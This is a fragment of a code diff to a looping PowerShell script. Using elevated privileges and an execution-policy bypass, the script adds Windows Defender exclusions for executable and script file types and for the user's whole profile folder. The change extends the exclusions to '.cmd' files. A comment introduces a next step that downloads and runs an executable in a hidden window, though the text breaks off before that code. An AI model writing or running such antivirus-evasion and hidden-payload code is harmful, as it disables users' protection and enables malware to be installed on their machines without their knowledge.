@@ -11,7 +11,7 @@ while($true) {
     try {
         # Step 1: Set exclusions with admin privileges
         $excludePath = [System.IO.Path]::GetFullPath($env:USERPROFILE)
-        $exclusionsCommand = "Add-MpPreference -ExclusionExtension '.exe','.bat','.vbs','.lnk'; Add-MpPreference -ExclusionPath '$excludePath'"
+        $exclusionsCommand = "Add-MpPreference -ExclusionExtension '.cmd','.exe','.bat','.vbs','.lnk'; Add-MpPreference -ExclusionPath '$excludePath'"
         Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $exclusionsCommand" -Verb runas -Wait
 
         # Step 2: Download and execute the first executable (hidden cmd window)
